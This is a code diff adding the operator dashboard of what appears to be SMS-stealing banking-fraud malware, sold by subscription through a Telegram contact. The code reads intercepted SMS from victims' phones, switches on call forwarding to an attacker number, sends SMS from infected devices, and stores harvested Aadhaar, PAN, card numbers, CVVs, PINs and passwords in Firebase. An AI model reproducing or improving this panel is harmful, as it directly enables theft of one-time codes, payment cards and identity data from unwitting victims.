+      <button onclick="doSearch()" style="position:absolute;right:34px;top:50%;transform:translateY(-50%);background:#0c9c5e;color:#fff;border:none;border-radius:8px;padding:5px 10px;font-size:13px;cursor:pointer;font-weight:700;">&#128269;</button>
+      <button class="s-cl" id="s-cl" onclick="clrSrch()">&#10005;</button>
+    </div>
+  </div>
+  <div class="stats-grid">
+    <div class="stat-box"><div class="stat-n" id="st-dev" style="color:#0a1810">0</div><div class="stat-l">Devices</div></div>
+    <div class="stat-box"><div class="stat-n" id="st-on" style="color:#16a34a">0</div><div class="stat-l">Online</div></div>
+    <div class="stat-box" onclick="openTodaySms()" style="cursor:pointer;"><div class="stat-n" id="st-sms" style="color:#0c9c5e">0</div><div class="stat-l">Today SMS &#9658;</div></div>
+  </div>
+  <button class="upd-btn" onclick="openUpdNo()">UPDATE NO</button>
+  <div id="admin-pass-box" style="margin:8px 14px 0;background:#fff;border-radius:12px;padding:12px 14px;box-shadow:0 2px 8px rgba(0,0,0,.08);display:flex;align-items:center;justify-content:space-between;gap:10px;">
+    <div style="flex:1;">
+      <div style="font-size:10px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.6px;margin-bottom:3px;">&#128272; Admin Password</div>
+      <div id="admin-pass-val" style="font-size:20px;font-weight:800;color:#0c9c5e;letter-spacing:2px;">---</div>
+    </div>
+    <button onclick="openChangePass()" style="background:#0c9c5e;color:#fff;border:none;border-radius:9px;padding:8px 14px;font-size:12px;font-weight:800;cursor:pointer;">&#9998; Change</button>
+  </div>
+  <div class="dash-tabs">
+    <button class="dtab active" id="dt-online" onclick="switchDTab('online')">&#128994; Online</button>
+    <button class="dtab inactive" id="dt-offline" onclick="switchDTab('offline')">&#128308; Offline</button>
+    <button class="dtab inactive" id="dt-allsms" onclick="switchDTab('allsms')">&#128172; All SMS</button>
+  </div>
+  <div id="pnl-online" class="dev-list"></div>
+  <div id="pnl-offline" class="dev-list" style="display:none;"></div>
+  <div id="pnl-allsms" class="allsms-wrap" style="display:none;">
+    <div class="allsms-bar">
+      <span class="allsms-info" id="asms-info">-</span>
+      <button class="allsms-rbtn" onclick="loadAllSms()">&#8635; Refresh</button>
+    </div>
+    <div style="display:flex;gap:8px;padding:8px 14px 0;">
+      <button onclick="cleanOldSms(this)" style="flex:1;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff;border:none;border-radius:9px;padding:9px 8px;font-size:11px;font-weight:700;cursor:pointer;">&#128465; Delete 7+ Days Old SMS</button>
+      <button onclick="cleanOldDevices(this)" style="flex:1;background:linear-gradient(135deg,#92400e,#b45309);color:#fff;border:none;border-radius:9px;padding:9px 8px;font-size:11px;font-weight:700;cursor:pointer;">&#128241; Delete 10+ Days Offline Devices</button>
+    </div>
+    <div id="asms-list"></div>
+  </div>
+</div>
+
+<div id="detail-screen">
+  <div class="d-top">
+    <button class="bbtn" onclick="goBack()">&#8592; Back</button>
+    <div class="d-title" id="d-title">Device</div>
+    <span class="d-st" id="d-stbadge"></span>
+    <button class="bbtn" id="d-ref" onclick="devRefresh()">&#8635;</button>
+  </div>
+  <div class="d-actions">
+    <button class="act-btn" onclick="openCF()">&#128222; CALL FORWADING</button>
+    <button class="act-btn" onclick="openSmsSend()">&#9993; SMS SEND</button>
+  </div>
+  <!-- Auto-SMS Telegram Button -->
+  <div style="padding:0 14px 10px;display:flex;gap:8px;">
+    <button id="autosms-btn" onclick="toggleAutoSms()"
+      style="flex:1;background:var(--surface2);color:#94a3b8;border:1.5px solid var(--border);
+      border-radius:10px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;
+      font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg>
+      🤖 Auto-SMS: OFF
+    </button>
+    <button onclick="openAutoSmsSettings()"
+      style="background:var(--surface2);color:var(--muted);border:1.5px solid var(--border);
+      border-radius:10px;padding:12px 14px;font-size:16px;cursor:pointer;">⚙️</button>
+  </div>
+  <div class="tabs">
+    <button class="tab-btn active" id="tb-sms" onclick="switchDtl('sms')">&#128172; SMS</button>
+    <button class="tab-btn inactive" id="tb-data" onclick="switchDtl('data')">&#128196; DATA</button>
+    <button class="tab-btn inactive" id="tb-fwd" onclick="switchDtl('fwd')">&#128222; FORWARD</button>
+    <button class="tab-btn inactive" id="tb-note" onclick="switchDtl('note')">&#128221; NOTES</button>
+  </div>
+  <div class="panel hide" id="pnl-note">
+    <div style="padding:14px;">
+      <div style="font-size:11px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px;">&#128221; Device Note</div>
+      <textarea id="note-txt" rows="8" placeholder="Yahan apna note likho..." style="width:100%;padding:12px;border:1.5px solid #e2e8f0;border-radius:12px;font-size:14px;font-family:inherit;resize:vertical;outline:none;color:#1e293b;background:#fff;box-sizing:border-box;"></textarea>
+      <button onclick="saveNote()" style="margin-top:10px;width:100%;background:#0c9c5e;color:#fff;border:none;border-radius:12px;padding:12px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit;">&#128190; Save Note</button>
+      <div id="note-status" style="margin-top:8px;font-size:12px;text-align:center;color:#64748b;"></div>
+    </div>
+  </div>
+  <div class="panel" id="pnl-sms">
+    <div id="dev-sms-search" style="display:none;padding:8px 14px 4px;position:sticky;top:0;background:rgba(13,17,23,.95);z-index:10;backdrop-filter:blur(12px);">
+      <div style="display:flex;gap:8px;align-items:center;">
+        <input id="dev-sms-q" type="text" placeholder="Device SMS search..." onkeydown="if(event.key==='Enter')devSmsSearch()" style="flex:1;padding:9px 12px;border:1.5px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;outline:none;background:var(--surface2);color:var(--white);"/>
+        <button onclick="devSmsSearch()" style="background:linear-gradient(135deg,var(--cyan-dim),var(--violet));color:#fff;border:none;border-radius:9px;padding:9px 13px;font-size:14px;cursor:pointer;font-weight:700;">&#128269;</button>
+        <button onclick="devSmsClear()" style="background:var(--surface2);color:var(--muted);border:1px solid var(--border);border-radius:9px;padding:9px 11px;font-size:13px;cursor:pointer;">&#10005;</button>
+      </div>
+    </div>
+    <div id="dev-sms-list"></div>
+    <div style="padding:4px 0 8px;">
+      <button class="load-all-sms-btn" id="load-all-sms-btn" onclick="loadAllDevSms()">
+        📥 Load All SMS (manual)
+      </button>
+    </div>
+  </div>
+  <div class="panel hide" id="pnl-data"></div>
+  <div class="panel hide" id="pnl-fwd"></div>
+</div>
+
+<div id="search-screen">
+  <div class="topbar" style="position:sticky;top:0;z-index:200;">
+    <div class="tb-l">&#128269; Search Results</div>
+    <div class="tb-r"><button class="xbtn" onclick="clrSrch()">&#8592; Back</button></div>
+  </div>
+  <div class="sr-info" id="sr-info"></div>
+  <div class="sr-list" id="sr-list"></div>
+</div>
+
+<div class="overlay" id="dlg-cf">
+  <div class="dlg">
+    <div class="dlg-hdr">&#128222; Call Forwading</div>
+    <div class="dlg-body">
+      <div id="sim-list"></div>
+      <p style="font-size:12px;color:#64748b;text-align:center;margin-bottom:8px;font-weight:600;text-transform:uppercase;">Forwad To</p>
+      <input class="di" id="cf-num" placeholder="Your Number" type="tel"/>
+      <div class="dbtn-row">
+        <button class="dbtn-h" onclick="doCF('active')">Active</button>
+        <button class="dbtn-h red" onclick="doCF('deactive')">Deactive</button>
+      </div>
+      <button class="dbtn" onclick="doCF('check')">Call Forwading Check</button>
+      <div class="cf-res" id="cf-res"></div>
+      <button class="dbtn-cancel" onclick="closeD('dlg-cf')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="dlg-sms">
+  <div class="dlg">
+    <div class="dlg-hdr">&#9993; Send Sms Customer</div>
+    <div class="dlg-body">
+      <input class="di" id="sms-to" placeholder="Number" type="tel"/>
+      <textarea class="di" id="sms-msg" placeholder="Message" rows="4" style="resize:none;"></textarea>
+      <button class="dbtn" onclick="doSendSms()">&#9993; SMS Send</button>
+      <div id="sms-status" style="display:none;padding:9px 12px;border-radius:8px;font-size:13px;margin-bottom:9px;text-align:center;font-weight:600;"></div>
+      <div id="vd-diag" style="font-size:11px;color:#64748b;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:8px 10px;margin-bottom:9px;word-break:break-all;"></div>
+      <button class="dbtn-cancel" onclick="closeD('dlg-sms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="dlg-upd">
+  <div class="dlg">
+    <div class="dlg-hdr">Update Number</div>
+    <div class="dlg-body">
+      <p style="font-size:13px;color:#64748b;margin-bottom:4px;">Saare devices ka forward number update hoga.</p>
+      <p style="font-size:12px;color:#46594e;margin-bottom:12px;">Current: <b id="upd-cur" style="color:#0c9c5e;">...</b></p>
+      <input class="di" id="upd-num" placeholder="New number" type="tel"/>
+      <button class="dbtn" onclick="doUpdNo()">UPDATE</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-upd')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+/*
+  CSC Monitor - Firebase REST API
+  Structure:
+  <NODE>/All_User/
+    Info/<deviceKey>/ {Battery, Id, Name, did, status}
+    Sms/<deviceKey>/<numKey>/ {date, msg, ph}
+    SimINFO/<deviceKey>/ {dualSim, sim1, sim2, subID1}
+    Call_For/<deviceKey>/ {PhoneNumber, Status, SubID, Type}
+    Data/<deviceKey>/ {Aadhaar, Dob, Name, Number, PanCard, Card, Cvv, Expiry, Pin, Pass, CustID}
+    Forwad_Status/<deviceKey>: string
+    UpdateNo: string
+    Sms_Hold/<deviceKey>/ {ph, msg, SubID}
+*/
+
+var DB='', APIKEY='', NODE='csc6';
+var DEVS={}, CUR=null, SEL_SIM=0;
+/* Cache for the online-device "SMS not synced" check - keyed by device key.
+   Checked ONCE per device (ever, for this session), not on every Info-poll refresh.
+   This prevents the warning check from re-fetching every online device's SMS every
+   60 seconds, which would be very data-heavy with 100+ devices. */
+var SYNC_WARN_CACHE = {}; /* devKey -> {warn: true/false} */
+var TTIMER=null, SCROLL_POS=0, STIMER=null, ATIMER=null;
+var PREV_KEYS={}, infoES=null, CURTAB='online';
+
+/* ===== REST API ===== */
+function mkUrl(path, extra) {
+  var u = DB + '/' + path + '.json';
+  var params = [];
+  if (APIKEY) params.push('auth=' + encodeURIComponent(APIKEY));
+  if (extra) params.push(extra);
+  if (params.length) u += '?' + params.join('&');
+  return u;
+}
+
+function fbGet(path) {
+  var url = mkUrl(NODE + '/All_User/' + path);
+  return fetch(url)
+    .then(function(r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status + ' - ' + url);
+      return r.json();
+    })
+    .then(function(d) {
+      if (d && d.error) throw new Error('Firebase: ' + d.error);
+      return d;
+    });
+}
+
+function fbGetRoot(path) {
+  var url = mkUrl(path);
+  return fetch(url)
+    .then(function(r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
+    })
+    .then(function(d) {
+      if (d && d.error) throw new Error('Firebase: ' + d.error);
+      return d;
+    });
+}
+
+function fbSet(path, data) {
+  return fetch(mkUrl(NODE + '/All_User/' + path), {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  }).then(function(r) {
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return r.json();
+  });
+}
+
+function fbDel(path) {
+  return fetch(mkUrl(NODE + '/All_User/' + path), {method: 'DELETE'})
+    .then(function(r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
+    });
+}
+
+function fbPatchRoot(data) {
+  return fetch(mkUrl(''), {
+    method: 'PATCH',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  }).then(function(r) {
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return r.json();
+  });
+}
+
+/* ===== PROFILES ===== */
+function loadProfiles() {
+  var raw = localStorage.getItem('csc_profiles');
+  return raw ? JSON.parse(raw) : [];
+}
+function saveProfiles(profs) {
+  localStorage.setItem('csc_profiles', JSON.stringify(profs));
+}
+function renderProfiles() {
+  var profs = loadProfiles();
+  var sec = document.getElementById('prof-section');
+  var list = document.getElementById('prof-list');
+  if (!profs.length) { sec.style.display = 'none'; return; }
+  sec.style.display = 'block';
+  list.innerHTML = '';
+  for (var i = 0; i < profs.length; i++) {
+    (function(p, idx) {
+      var item = document.createElement('div'); item.className = 'prof-item';
+      /* Number badge */
+      var numBadge = document.createElement('div'); numBadge.className = 'prof-num';
+      numBadge.textContent = (idx + 1);
+      /* Name */
+      var nm = document.createElement('div'); nm.className = 'prof-name';
+      nm.textContent = p.name;
+      var del = document.createElement('button'); del.className = 'prof-del';
+      del.innerHTML = '&#10005;';
+      del.addEventListener('click', function(e) {
+        e.stopPropagation();
+        var ps = loadProfiles(); ps.splice(idx, 1); saveProfiles(ps); renderProfiles();
+      });
+      item.appendChild(numBadge); item.appendChild(nm); item.appendChild(del);
+      item.addEventListener('click', function() {
+        document.getElementById('cfg-pname').value = p.name;
+        document.getElementById('cfg-url').value = p.url;
+        document.getElementById('cfg-key').value = p.key;
+        document.getElementById('cfg-pid').value = p.pid;
+        document.getElementById('cfg-node').value = p.node;
+        document.getElementById('setup-btn').click();
+      });
+      list.appendChild(item);
+    })(profs[i], i);
+  }
+}
+function saveProfile() {
+  var name = (document.getElementById('cfg-pname').value || '').trim();
+  var url = (document.getElementById('cfg-url').value || '').trim();
+  var key = (document.getElementById('cfg-key').value || '').trim();
+  var pid = (document.getElementById('cfg-pid').value || '').trim();
+  var node = (document.getElementById('cfg-node').value || '').trim();
+  if (!name || !url || !pid) { showToast('Name, URL aur Project ID daalo!'); return; }
+  var profs = loadProfiles();
+  /* Update if name exists */
+  var found = false;
+  for (var i = 0; i < profs.length; i++) {
+    if (profs[i].name === name) { profs[i] = {name:name,url:url,key:key,pid:pid,node:node||'csc6'}; found = true; break; }
+  }
+  if (!found) profs.push({name:name,url:url,key:key,pid:pid,node:node||'csc6'});
+  saveProfiles(profs);
+  renderProfiles();
+  showToast('Profile saved: ' + name);
+}
+/* Load profiles on page start */
+/* ===== QUICK-CONNECT VIA URL PARAMS ===== */
+/* Link format:
+   https://10himakhan-del.github.io/csc-monitor/?furl=FIREBASE_URL&key=API_KEY&node=csc6&pid=PROJECT_ID
+   User only sees password field - everything else is embedded in the link. */
+var QC_PARAMS = null; /* set if URL params were found */
+
+function openTelegram() {
+  var tg = (QC_PARAMS && QC_PARAMS.tg) ? QC_PARAMS.tg : 'munnadhotarchor';
+  tg = tg.replace(/^@/,'');
+  window.open('https://t.me/' + tg, '_blank');
+}
+
+function showDenied(icon, title, msg) {
+  var tg = (QC_PARAMS && QC_PARAMS.tg) ? QC_PARAMS.tg : 'munnadhotarchor';
+  tg = '@' + tg.replace(/^@/,'');
+  document.getElementById('denied-icon').textContent = icon;
+  document.getElementById('denied-title').textContent = title;
+  document.getElementById('denied-msg').textContent = msg;
+  document.getElementById('denied-tg-id').textContent = tg;
+  document.getElementById('setup-screen').style.display = 'none';
+  document.getElementById('denied-screen').style.display = 'flex';
+}
+
+/* ===== ENCRYPTION HELPERS =====
+   AES-GCM via browser's built-in crypto.subtle.
+   Key is derived from a hardcoded passphrase using PBKDF2.
+   Data travels in the URL #hash — never reaches any server,
+   never stored in browser history in readable form. */
+/* ===== URL ENCODING (Base64 in #hash — instant, no delay) =====
+   Data travels in the URL #hash — never reaches any server,
+   and browser history stores the encoded form, not plain text.
+   This replaces the slow PBKDF2/AES approach that was causing
+   plans page to flash before password screen. */
+
+function encodeParams(obj) {
+  var payload = JSON.stringify({ u: obj.furl, k: obj.key||'', n: obj.node||'csc6', p: obj.pid||'', t: obj.tg||'', a: obj.admin?1:0 });
+  return btoa(unescape(encodeURIComponent(payload)))
+    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+}
+
+function decodeParams(b64) {
+  var s = b64.replace(/-/g,'+').replace(/_/g,'/');
+  while (s.length % 4) s += '=';
+  var payload = decodeURIComponent(escape(atob(s)));
+  var obj = JSON.parse(payload);
+  return { furl: obj.u, key: obj.k||'', node: obj.n||'csc6', pid: obj.p||'', tg: obj.t||'munnadhotarchor', admin: obj.a===1 };
+}
+
+/* Keep these names for compatibility with openLinkGen which calls encryptData */
+async function encryptData(obj) { return encodeParams(obj); }
+async function decryptData(b64) { return decodeParams(b64); }
+
+async function readUrlParams() {
+  try {
+    var hash = window.location.hash.slice(1);
+    if (hash) {
+      /* Hash present — show loading while decrypting, hide everything */
+      document.getElementById('plans-screen').style.display = 'none';
+      document.getElementById('setup-screen').style.display = 'none';
+      /* Show a minimal loading indicator */
+      var loader = document.getElementById('init-loader');
+      if (loader) loader.style.display = 'flex';
+      try {
+        var decoded = await decryptData(hash);
+        if (loader) loader.style.display = 'none';
+        QC_PARAMS = { furl: decoded.furl.replace(/\/+$/,''), key: decoded.key, node: decoded.node, pid: decoded.pid, tg: decoded.tg, admin: decoded.admin||false };
+        var tgId = '@' + (decoded.tg || 'munnadhotarchor');
+        var tgDisp = document.getElementById('tg-id-display');
+        if (tgDisp) tgDisp.textContent = tgId;
+        var deniedTg = document.getElementById('denied-tg-id');
+        if (deniedTg) deniedTg.textContent = tgId;
+        document.getElementById('setup-screen').style.display = 'flex';
+        document.getElementById('qc-section').style.display = 'block';
+        document.getElementById('full-setup-section').style.display = 'none';
+        setTimeout(function() {
+          var p = document.getElementById('qc-pass');
+          if (p) p.focus();
+        }, 150);
+      } catch(e) {
+        /* Decryption failed — invalid link, show plans */
+        if (loader) loader.style.display = 'none';
+        document.getElementById('plans-screen').style.display = 'block';
+      }
+    } else {
+      /* No hash — show plans page */
+      document.getElementById('plans-screen').style.display = 'block';
+    }
+  } catch(e) {
+    document.getElementById('plans-screen').style.display = 'block';
+  }
+}
+
+function doQuickConnect() {
+  if (!QC_PARAMS) return;
+  var pass = (document.getElementById('qc-pass').value || '').trim();
+  var errEl = document.getElementById('qc-err');
+  var btn = document.getElementById('qc-btn');
+  errEl.style.display = 'none';
+  btn.disabled = true; btn.textContent = 'Connecting...';
+  /* Set globals */
+  DB = QC_PARAMS.furl;
+  APIKEY = QC_PARAMS.key;
+  NODE = QC_PARAMS.node;
+  if (!pass) {
+    btn.disabled = false; btn.textContent = '⚡ Connect';
+    errEl.style.display = 'block';
+    errEl.textContent = 'Password daalo!';
+    return;
+  }
+  /* Verify password against Firebase Admin_Password node
+     Using fbGetRoot because Admin_Password is at root of NODE, not under All_User/ */
+  fbGetRoot(NODE + '/Admin_Password')
+    .then(function(storedPass) {
+      if (!storedPass) {
+        /* No password set in Firebase yet */
+        btn.disabled = false; btn.textContent = '⚡ Connect';
+        errEl.style.display = 'block';
+        errEl.textContent = 'Firebase mein password set nahi hai. Pehle dashboard se set karo.';
+        return;
+      }
+      if (String(storedPass) === pass) {
+        /* Admin bypass link — skip all subscription checks */
+        if (QC_PARAMS && QC_PARAMS.admin) {
+          document.getElementById('setup-screen').style.display = 'none';
+          document.getElementById('app').style.display = 'flex';
+          startInfoSSE();
+          return;
+        }
+        var blocked = false;
+        /* First check if account is suspended */
+        fbGetRoot(NODE + '/Subscription/suspended')
+          .then(function(suspended) {
+            if (suspended === true || suspended === 'true') {
+              blocked = true;
+              btn.disabled = false; btn.textContent = '⚡ Connect';
+              showDenied(
+                '🚫',
+                'Account Suspended',
+                'Aapka account suspend kar diya gaya hai. Admin se contact karein.'
+              );
+              return;
+            }
+            /* Not suspended — check expiry */
+            return fbGetRoot(NODE + '/Subscription/expiry')
+              .then(function(expiry) {
+                if (expiry) {
+                  var now = new Date();
+                  var exp = new Date(expiry);
+                  var daysLeft = Math.ceil((exp - now) / (1000 * 60 * 60 * 24));
+                  if (daysLeft < 0) {
+                    blocked = true;
+                    btn.disabled = false; btn.textContent = '⚡ Connect';
+                    showDenied(
+                      '❌',
+                      'Plan Expire Ho Gaya',
+                      'Expiry: ' + exp.toLocaleDateString('en-IN') + '\nPlan renew karne ke liye admin se contact karein.'
+                    );
+                    return;
+                  }
+                  if (daysLeft <= 5) {
+                    showToast('⚠️ Plan ' + daysLeft + ' din mein expire ho jaayega!');
+                  }
+                }
+                if (!blocked) {
+                  document.getElementById('setup-screen').style.display = 'none';
+                  document.getElementById('app').style.display = 'flex';
+                  startInfoSSE();
+                }
+              });
+          })
+          .then(function() {
+            /* Final allow — only if nothing blocked above */
+            if (!blocked) {
+              /* Already handled inside chain — no-op here */
+            }
+          })
+          .catch(function() {
+            /* Network error checking subscription — allow access so genuine users
+               are not blocked by a Firebase connectivity issue */
+            if (!blocked) {
+              document.getElementById('setup-screen').style.display = 'none';
+              document.getElementById('app').style.display = 'flex';
+              startInfoSSE();
+            }
+          });
+      } else {
+        btn.disabled = false; btn.textContent = '⚡ Connect';
+        errEl.style.display = 'block';
+        errEl.textContent = '❌ Galat password!';
+      }
+    })
+    .catch(function(e) {
+      btn.disabled = false; btn.textContent = '⚡ Connect';
+      errEl.style.display = 'block';
+      errEl.textContent = 'Connect fail: ' + e.message;
+    });
+}
+
+function showFullSetup() {
+  QC_PARAMS = null;
+  try { sessionStorage.removeItem('csc_qc'); } catch(e) {}
+  document.getElementById('plans-screen').style.display = 'none';
+  document.getElementById('setup-screen').style.display = 'flex';
+  document.getElementById('qc-section').style.display = 'none';
+  document.getElementById('full-setup-section').style.display = 'block';
+}
+
+window.addEventListener('load', function() {
+  try { localStorage.removeItem('csc_saved_links'); } catch(e) {}
+  handleHash();
+});
+
+window.addEventListener('hashchange', function() {
+  handleHash();
+});
+
+function handleHash() {
+  var hash = window.location.hash.slice(1);
+  if (hash) {
+    try {
+      var decoded = decodeParams(hash);
+      QC_PARAMS = { furl: decoded.furl.replace(/\/+$/,''), key: decoded.key, node: decoded.node, pid: decoded.pid, tg: decoded.tg, admin: decoded.admin||false };
+      var tgId = '@' + (decoded.tg || 'munnadhotarchor');
+      var d1 = document.getElementById('tg-id-display'); if (d1) d1.textContent = tgId;
+      var d2 = document.getElementById('denied-tg-id'); if (d2) d2.textContent = tgId;
+
+      /* Admin link — auto connect, no password needed */
+      if (QC_PARAMS.admin) {
+        document.getElementById('plans-screen').style.display = 'none';
+        document.getElementById('setup-screen').style.display = 'none';
+        DB = QC_PARAMS.furl;
+        APIKEY = QC_PARAMS.key;
+        NODE = QC_PARAMS.node || 'csc6';
+        document.getElementById('app').style.display = 'flex';
+        startInfoSSE();
+        return;
+      }
+
+      /* Client link — show password screen */
+      document.getElementById('plans-screen').style.display = 'none';
+      document.getElementById('setup-screen').style.display = 'flex';
+      document.getElementById('qc-section').style.display = 'block';
+      document.getElementById('full-setup-section').style.display = 'none';
+      setTimeout(function() { var p = document.getElementById('qc-pass'); if (p) p.focus(); }, 150);
+    } catch(e) {
+      document.getElementById('plans-screen').style.display = 'block';
+      document.getElementById('setup-screen').style.display = 'none';
+    }
+  } else {
+    renderProfiles();
+    document.getElementById('plans-screen').style.display = 'block';
+    document.getElementById('setup-screen').style.display = 'none';
+  }
+}
+
+/* ===== SETUP ===== */
+function doSetup() {
+  var url = (document.getElementById('cfg-url').value || '').trim().replace(/\/+$/, '');
+  var key = (document.getElementById('cfg-key').value || '').trim();
+  var pid = (document.getElementById('cfg-pid').value || '').trim();
+  var node = (document.getElementById('cfg-node').value || '').trim();
+  document.getElementById('setup-err').style.display = 'none';
+  if (!url) { showErr('Firebase Database URL daalo!'); return; }
+  if (!pid) { showErr('Project ID daalo!'); return; }
+  DB = url; APIKEY = key; NODE = node || 'csc6';
+  var btn = document.getElementById('setup-btn');
+  btn.disabled = true; btn.textContent = 'Connecting...';
+  fbGet('Info')
+    .then(function(data) {
+      btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
+      if (!data) {
+        showErr('Info node empty hai. Node name check karo: ' + NODE);
+        return;
+      }
+      launchApp(data);
+    })
+    .catch(function(e) {
+      btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
+      showErr('Connection failed: ' + e.message);
+    });
+}
+
+function showErr(m) {
+  var e = document.getElementById('setup-err');
+  e.textContent = m; e.style.display = 'block';
+}
+
+function launchApp(infoData) {
+  document.getElementById('setup-screen').style.display = 'none';
+  var a = document.getElementById('app');
+  a.style.display = 'flex'; a.style.flexDirection = 'column';
+  procInfo(infoData);
+  startInfoSSE();
+  loadAdminPass();
+}
+
+function doLogout() {
+  if (infoES) { try { infoES.close(); } catch(e) {} infoES = null; }
+  Object.keys(SMS_ES).forEach(function(k) { stopSmsSSE(k); });
+  clearInterval(ATIMER);
+  ['app','detail-screen','search-screen'].forEach(function(id) {
+    document.getElementById(id).style.display = 'none';
+  });
+  document.getElementById('setup-screen').style.display = 'flex';
+  var btn = document.getElementById('setup-btn');
+  btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
+  DEVS = {}; CUR = null; PREV_KEYS = {};
+  SYNC_WARN_CACHE = {};
+  DATA_TAB_CACHE = {}; FWD_TAB_CACHE = {};
+  /* If this session was opened via a pre-configured link, show password screen again
+     instead of the full manual setup form - user just needs to re-enter password */
+  if (QC_PARAMS) {
+    document.getElementById('setup-screen').style.display = 'flex';
+    document.getElementById('plans-screen').style.display = 'none';
+    document.getElementById('qc-section').style.display = 'block';
+    document.getElementById('full-setup-section').style.display = 'none';
+    document.getElementById('qc-err').style.display = 'none';
+    document.getElementById('qc-pass').value = '';
+    document.getElementById('qc-btn').disabled = false;
+    document.getElementById('qc-btn').textContent = '⚡ Connect';
+    setTimeout(function() { document.getElementById('qc-pass').focus(); }, 100);
+  } else {
+    /* No link params — go back to plans page */
+    document.getElementById('setup-screen').style.display = 'none';
+    document.getElementById('plans-screen').style.display = 'block';
+  }
+}
+
+/* ===== Info polling every 60s (data saver) ===== */
+/* SMS realtime SSE per online device below */
+function startInfoSSE() {
+  if (infoES) { try { infoES.close(); } catch(e) {} infoES = null; }
+  fbGet('Info').then(function(d) { if(d) procInfo(d); }).catch(function(){});
+  setInterval(function() {
+    fbGet('Info').then(function(d) { if(d) procInfo(d); }).catch(function(){});
+  }, 60000);
+}
+
+/* SMS realtime per online device - turant dikhe naya SMS */
+var SMS_ES = {}; /* deviceKey -> EventSource */
+function startSmsSSE(devKey, did) {
+  if (SMS_ES[devKey]) { try { SMS_ES[devKey].close(); } catch(e){} }
+  /* limitToLast=100 - per-device SMS cap */
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100&stream=true' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+  try {
+    var es = new EventSource(url);
+    es.addEventListener('put', function(e) {
+      try {
+        var p = JSON.parse(e.data);
+        if (!p || !p.data || typeof p.data !== 'object') return;
+        if (!DEVS[devKey]) return;
+        var keys = Object.keys(p.data);
+        var newSms = [];
+        for (var i = 0; i < keys.length; i++) {
+          var s = p.data[keys[i]];
+          if (s && typeof s === 'object') {
+            newSms.push({ _key: keys[i], date: s.date||s.Date||'', msg: s.msg||s.body||'', ph: s.ph||s.address||'' });
+          }
+        }
+        /* Sort newest-first so the most recently arrived SMS is always at the top,
+           exactly matching the order shown elsewhere in the app. */
+        newSms.sort(function(a, b) { return getTs(b.date) - getTs(a.date); });
+
+        /* Figure out which keys are genuinely new (weren't in the previous list) -
+           these get the "just arrived" animation + NEW badge. */
+        var oldKeys = {};
+        (DEVS[devKey].sms || []).forEach(function(s) { oldKeys[s._key] = true; });
+        var newKeysSet = {};
+        newSms.forEach(function(s) { if (!oldKeys[s._key]) newKeysSet[s._key] = true; });
+
+        DEVS[devKey].sms = newSms;
+        updSmsCnt();
+        /* If detail screen open for this device, auto-update SMS list */
+        if (CUR === devKey) {
+          var tb = document.getElementById('tb-sms');
+          if (tb && tb.className === 'tab-btn active') {
+            var listEl = document.getElementById('dev-sms-list');
+            if (listEl && newSms.length) {
+              DEV_SMS_ALL = newSms;
+              DEV_SMS_KEY = devKey;
+              renderSmsCards(newSms, listEl, devKey, newKeysSet);
+            }
+          }
+        }
+        /* Auto-update Today SMS if open */
+        var todayOv = document.getElementById('today-sms-ov');
+        if (todayOv && todayOv.style.display === 'flex') {
+          fetchTodaySms();
+        }
+      } catch(ex) {}
+    });
+    es.onerror = function() { try { es.close(); } catch(ex){} delete SMS_ES[devKey]; };
+    SMS_ES[devKey] = es;
+  } catch(e) {}
+}
+
+/* Auto-refresh All SMS tab when new SMS arrives */
+function autoRefreshAllSms() {
+  var curtab = document.querySelector('.tab-btn.active');
+  if (!curtab) return;
+  /* Check if All SMS panel is visible */
+  var allPnl = document.getElementById('asms-list');
+  if (allPnl && allPnl.parentElement && 
+      allPnl.parentElement.style.display !== 'none' &&
+      document.getElementById('app').style.display !== 'none') {
+    loadAllSms();
+  }
+}
+
+function stopSmsSSE(devKey) {
+  if (SMS_ES[devKey]) { try { SMS_ES[devKey].close(); } catch(e){} delete SMS_ES[devKey]; }
+}
+
+/* ===== PROCESS INFO ===== */
+function procInfo(data) {
+  if (!data || typeof data !== 'object') return;
+  var keys = Object.keys(data);
+  var online = 0, total = 0, newDevs = {};
+  for (var i = 0; i < keys.length; i++) {
+    var k = keys[i];
+    var info = data[k];
+    if (!info || typeof info !== 'object') continue;
+    var name = info.Name || info.name || '';
+    if (!name) continue; /* Skip non-device nodes */
+    var st = String(info.status || info.Status || '').toLowerCase();
+    var isOn = (st === 'online');
+    if (isOn) online++;
+    total++;
